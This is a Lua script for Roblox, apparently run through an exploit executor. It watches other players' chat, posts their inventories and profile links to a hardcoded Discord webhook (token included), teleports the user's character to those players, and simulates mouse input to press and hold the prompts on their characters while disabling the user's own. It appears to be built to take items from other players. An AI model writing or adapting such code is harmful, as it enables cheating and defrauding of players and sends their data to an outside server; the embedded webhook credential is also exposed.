local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Fix 1: Added proper error handling for webhook
local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    
    local success, err = pcall(function()
        local jsonPayload = HttpService:JSONEncode(payload)
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonPayload
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
        end
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(err))
    end
end

-- Fix 2: Proper character wait function
local function waitForCharacter(player)
    if not player.Character then
        player.CharacterAdded:Wait()
    end
    return player.Character
end

-- Fix 3: Better prompt finding with validation
local function findPrompt(targetChar)
    if not targetChar then return nil end
    local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return nil end
    
    for _, child in pairs(humanoidRootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") and child.Enabled then
            return child
        end
    end
    return nil
end

-- Fix 4: Precise clicking with position validation
local function clickPrompt(prompt)
    if not prompt or not prompt.Parent then return false end
    
    local promptPart = prompt.Parent
    local startTime = os.clock()
    
    -- Get screen position with validation
    local screenPos, visible = Camera:WorldToScreenPoint(promptPart.Position)
    if not visible then return false end
    
    -- Adjusted target position for prompt click
    local targetPos = Vector2.new(
        screenPos.X,
        screenPos.Y - 35 -- Vertical offset for prompt
    )
    
    -- Smooth mouse movement
    for i = 1, 5 do
        local t = i/5
        local currentPos = Vector2.new(
            (i-1)/5 * targetPos.X,
            (i-1)/5 * targetPos.Y
        )
        local newPos = currentPos:Lerp(targetPos, t)
        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
        task.wait(0.1)
    end
    
    -- Click and hold
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
    
    -- Maintain position during hold
    while os.clock() - startTime < prompt.HoldDuration + 0.3 do
        screenPos = Camera:WorldToScreenPoint(promptPart.Position)
        if not screenPos then break end
        
        targetPos = Vector2.new(screenPos.X, screenPos.Y - 35)
        VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
        task.wait(0.05)
    end
    
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
    return true
end

-- Fix 5: Proper target interaction with checks
local function interactWithTarget(target)
    local targetChar = waitForCharacter(target)
    local myChar = waitForCharacter(LocalPlayer)
    
    if not targetChar or not myChar then return end
    
    -- Position in front of target
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -2.5))
    end
    
    -- Find and click prompt
    local prompt = findPrompt(targetChar)
    if prompt then
        clickPrompt(prompt)
    end
end

-- Fix 6: Improved mention detection
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Check for mentions
    local lowerMsg = message:lower()
    local lowerName = LocalPlayer.Name:lower()
    
    if not (lowerMsg:find("@"..lowerName) 
            or lowerMsg:find("@everyone") 
            or lowerMsg:find("@here")) then
        return
    end
    
    -- Get inventory
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    -- Create embed
    local embed = {
        title = "🎯 Mention from "..player.Name,
        description = "**Message:** ```"..message.."```",
        color = 0xFFA500,
        fields = {
            {name = "📦 Inventory ("..#items..")", value = #items > 0 and "```"..table.concat(items, ", ").."```" or "```Empty```", inline = false},
            {name = "🔗 Profile", value = "[Click here](https://www.roblox.com/users/"..player.UserId.."/profile)", inline = false}
        },
        footer = {
            text = os.date("%X")
        }
    }
    
    sendWebhook("@everyone", embed)
    interactWithTarget(player)
end

-- Fix 7: Proper initialization
local function initialize()
    -- Setup chat listeners
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                onPlayerChatted(player, msg)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            onPlayerChatted(player, msg)
        end)
    end)
    
    -- Disable local prompts
    local function disablePrompts(char)
        local root = char:WaitForChild("HumanoidRootPart", 5)
        if root then
            for _, child in pairs(root:GetChildren()) do
                if child:IsA("ProximityPrompt") then
                    child.Enabled = false
                end
            end
        end
    end
    
    if LocalPlayer.Character then
        disablePrompts(LocalPlayer.Character)
    end
    LocalPlayer.CharacterAdded:Connect(disablePrompts)
end

-- Fix 8: Error protected execution
local success, err = pcall(initialize)
if not success then
    warn("Initialization failed: "..tostring(err))
end
